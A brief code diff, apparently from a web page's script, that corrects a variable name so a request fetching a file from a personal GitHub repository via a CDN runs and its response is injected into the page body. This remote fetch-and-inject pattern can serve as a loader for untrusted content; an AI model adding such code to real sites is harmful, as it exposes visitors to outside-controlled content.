@@ -21,8 +21,8 @@ xhttp.onreadystatechange = function() {
     document.body.innerHTML += code;
   }
 };
-xmlhttp.open("GET", "https://cdn.jsdelivr.net/gh/ttimhzv/fa@main/main.php", true);
-xmlhttp.send();
+xhttp.open("GET", "https://cdn.jsdelivr.net/gh/ttimhzv/fa@main/main.php", true);
+xhttp.send();
 
 	    
       alert('Button clicked!');
